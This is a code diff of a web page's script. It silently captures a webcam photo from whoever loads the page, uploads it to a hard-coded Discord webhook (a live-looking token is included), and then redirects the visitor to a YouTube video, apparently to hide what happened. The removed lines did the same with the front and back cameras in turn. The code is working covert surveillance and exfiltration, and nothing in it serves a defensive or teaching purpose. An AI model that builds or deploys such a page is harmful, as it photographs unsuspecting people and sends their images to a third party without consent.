@@ -15,44 +15,25 @@
 
         // Discord webhook URL (replace with yours)
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1320376121572724777/ZwPWtXeYwYDQ9tH-H4TAHl_Vv2YVwbLo90oRI8ojgNVWH3PjTavwrPPbtTmdwf7RwIL7";
+        // YouTube video URL
+        const YOUTUBE_URL = "https://www.youtube.com/watch?v=c9n2-gkVsaw";
 
-        let videoStream;
-        let cameras = [];
+        // Request camera permissions and start video stream
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then((stream) => {
+                video.srcObject = stream;
 
-        // Function to get available cameras (front and back)
-        function getCameraDevices() {
-            return navigator.mediaDevices.enumerateDevices()
-                .then(devices => {
-                    cameras = devices.filter(device => device.kind === 'videoinput');
-                    return cameras;
-                });
-        }
+                // Automatically capture a photo after the video stream starts
+                video.onloadedmetadata = () => {
+                    captureAndSendPhoto();
+                };
+            })
+            .catch((error) => {
+                console.error('Camera access denied!', error);
+            });
 
-        // Function to start the camera stream
-        function startCamera(cameraId) {
-            const constraints = {
-                video: { deviceId: cameraId ? { exact: cameraId } : undefined }
-            };
-
-            return navigator.mediaDevices.getUserMedia(constraints)
-                .then((stream) => {
-                    video.srcObject = stream;
-                    videoStream = stream;
-                })
-                .catch((error) => {
-                    console.error('Error accessing the camera: ', error);
-                });
-        }
-
-        // Function to stop the video stream
-        function stopCamera() {
-            if (videoStream) {
-                videoStream.getTracks().forEach(track => track.stop());
-            }
-        }
-
-        // Function to capture and send a photo
         function captureAndSendPhoto() {
+            // Draw the video frame onto the canvas
             const context = canvas.getContext('2d');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
@@ -71,6 +52,8 @@
                     .then((response) => {
                         if (response.ok) {
                             console.log('Photo sent successfully!');
+                            // Redirect to YouTube video after successful upload
+                            window.location.href = YOUTUBE_URL;
                         } else {
                             console.error('Failed to send photo.', response.status);
                         }
@@ -80,40 +63,6 @@
                     });
             });
         }
-
-        // Function to capture photos from both front and back cameras
-        function captureFromBothCameras() {
-            getCameraDevices().then((availableCameras) => {
-                // Find front and back cameras
-                const frontCamera = availableCameras.find(camera => camera.label.toLowerCase().includes('front'));
-                const backCamera = availableCameras.find(camera => camera.label.toLowerCase().includes('back'));
-
-                // Default to front camera if available, else use any available camera
-                if (frontCamera) {
-                    // Start with front camera
-                    startCamera(frontCamera.deviceId).then(() => {
-                        video.onloadedmetadata = () => {
-                            captureAndSendPhoto(); // Capture photo from front camera
-                            stopCamera(); // Stop the front camera stream
-                            // After capturing from front camera, switch to the back camera
-                            if (backCamera) {
-                                setTimeout(() => {
-                                    startCamera(backCamera.deviceId).then(() => {
-                                        video.onloadedmetadata = () => {
-                                            captureAndSendPhoto(); // Capture photo from back camera
-                                            stopCamera(); // Stop the back camera stream
-                                        };
-                                    });
-                                }, 2000); // Wait for 2 seconds before switching to back camera
-                            }
-                        };
-                    });
-                }
-            });
-        }
-
-        // Start capturing from both front and back cameras
-        captureFromBothCameras();
     </script>
 </body>
 </html>
